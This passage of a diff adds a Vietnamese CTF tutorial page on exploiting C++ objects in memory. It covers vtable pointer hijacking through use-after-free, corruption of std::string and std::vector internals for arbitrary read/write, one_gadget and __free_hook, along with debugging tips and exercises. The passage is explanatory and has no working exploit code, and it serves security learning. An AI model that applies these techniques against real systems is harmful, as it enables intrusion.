+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Idx hàm ảo sai</h4><p>call [rax+off] — off quyết vị trí trong bảng giả. Đọc disasm.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>rdi=this cản system</h4><p>Đầu obj là con trỏ. Dùng one_gadget hoặc setup "/bin/sh" khéo.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>SSO nhầm</h4><p>Chuỗi ngắn inline, không có con trỏ heap. Dùng chuỗi &gt;15 ký tự.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">c++filt</div><h4>Demangle</h4><p>_ZN... → tên gốc.</p></div>
+    <div class="card"><div class="term">IDA/Ghidra</div><h4>vtable &amp; class</h4><p>Nhận diện struct/vtable.</p></div>
+    <div class="card"><div class="term">gdb vmmap</div><h4>obj/heap</h4><p>Địa chỉ đối tượng.</p></div>
+    <div class="card"><div class="term">one_gadget</div><h4>RIP→shell</h4><p>Khỏi lo rdi=this.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi hijack không ăn</h2>
+  <div class="grid">
+    <div class="card"><h4>Crash ở call [rax+8]</h4><p>vptr giả sai. Trỏ tới bảng chứa addr hợp lệ.</p></div>
+    <div class="card"><h4>system(this) fail</h4><p>rdi=obj không phải "/bin/sh". one_gadget.</p></div>
+    <div class="card"><h4>Chunk không tái dùng</h4><p>Size note ≠ size obj. Khớp size tcache.</p></div>
+    <div class="card"><h4>SSO không có con trỏ</h4><p>String ngắn inline. Dùng chuỗi dài.</p></div>
+    <div class="card"><h4>Không leak được</h4><p>UAF đọc vptr cũ → libc. Hoặc string _M_p=GOT.</p></div>
+    <div class="card"><h4>idx vtable lệch</h4><p>Nhiều hàm ảo. Đếm đúng offset từ disasm.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Bề mặt C++</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Đối tượng/cấu trúc</th><th>Khai thác</th></tr></thead>
+    <tbody>
+      <tr><td>vtable (virtual)</td><td>ghi đè vptr → control call ảo</td></tr>
+      <tr><td>std::string</td><td>đổi _M_p → arbitrary R/W</td></tr>
+      <tr><td>std::vector</td><td>đổi _M_start → OOB R/W</td></tr>
+      <tr><td>std::function/lambda</td><td>con trỏ hàm nội bộ → hijack</td></tr>
+      <tr><td>exception/unwind</td><td>ghi đè handler (hiếm, phức tạp)</td></tr>
+      <tr><td>UAF trên đối tượng</td><td>tái dùng chunk đổi vptr</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc/ABI</span>libstdc++ (g++) layout khác libc++ (clang) đôi chút nhưng cùng nguyên lý {ptr,size,cap}/vptr-offset-0. 32-bit: con trỏ 4 byte, offset chia đôi. vtable cạnh RTTI (offset -8 có typeinfo). Itanium C++ ABI chuẩn trên Linux.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · UAF vtable</div><p>delete+note tái dùng, ghi đè vptr → one_gadget.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · string R/W</div><p>Overflow _M_p → leak GOT + ghi __free_hook.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · vector OOB</div><p>_M_start đổi → OOB đọc/ghi tùy ý.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">vtable</div><p>Mảng con trỏ hàm ảo.</p></div>
+    <div class="card"><div class="term">vptr</div><p>Con trỏ vtable, obj+0.</p></div>
+    <div class="card"><div class="term">this</div><p>Con trỏ obj = rdi.</p></div>
+    <div class="card"><div class="term">SSO</div><p>Chuỗi ngắn inline.</p></div>
+    <div class="card"><div class="term">_M_p</div><p>Con trỏ data của string.</p></div>
+    <div class="card"><div class="term">mangling</div><p>_ZN... tên C++.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="heap_bugs.html">UAF</a> · <a href="tcache_fastbin.html">tcache</a> · <a href="hook_overwrite.html">__free_hook</a> · <a href="rop_basics.html">one_gadget</a>.</li>
+    <li>Itanium C++ ABI (vtable layout) · libstdc++ string/vector source · c++filt.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · C++.</strong> Đối tượng có vptr (obj+0) → vtable → hàm ảo. Ghi đè vptr (UAF/overflow) → call ảo nhảy bảng giả → RIP (rdi=this → one_gadget). std::string/vector = {ptr,size,cap} → đổi con trỏ = arbitrary R/W.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("cpp-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("cpp-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var cells=document.getElementById("vbCells"),msg=document.getElementById("vbMsg");
+  var state="clean";
+  function render(){
+    var vptr = state==="clean" ? "0x403d20 (vtable thật)" : "0x4052a8 (bảng GIẢ → obj+8)";
+    var entry = state==="clean" ? "0x401350 (speak code)" : "0x7ffff7e52290 (&system/one_gadget)";
+    var rows=[
+      {n:"obj+0x00 (vptr)",v:vptr,cls:"vptr"+(state!=="clean"?" hit":"")},
+      {n:"obj+0x08",v:state==="clean"?'name "AAAA"':entry,cls:state!=="clean"?"hit":""},
+      {n:"obj+0x10",v:state==="clean"?"...":"...",cls:""}
+    ];
+    cells.innerHTML=rows.map(function(r){
+      return '<div class="c '+r.cls+'"><span>'+r.n+'</span><span class="a">'+r.v+'</span></div>';
+    }).join("");
+    msg.innerHTML = state==="clean"
+      ? 'call speak(): vptr=*obj=0x403d20 → *(0x403d20+8)=0x401350 → call. Bình thường.'
+      : '💥 call speak(): vptr=*obj=<b>obj+8</b> → *(obj+8)=<b>&system</b> → call &system, rdi=obj. CHIẾM RIP! (one_gadget để khỏi lo rdi).';
+  }
+  document.getElementById("hijackBtn").addEventListener("click",function(){state="hijacked";render();});
+  document.getElementById("vbReset").addEventListener("click",function(){state="clean";render();});
+  render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
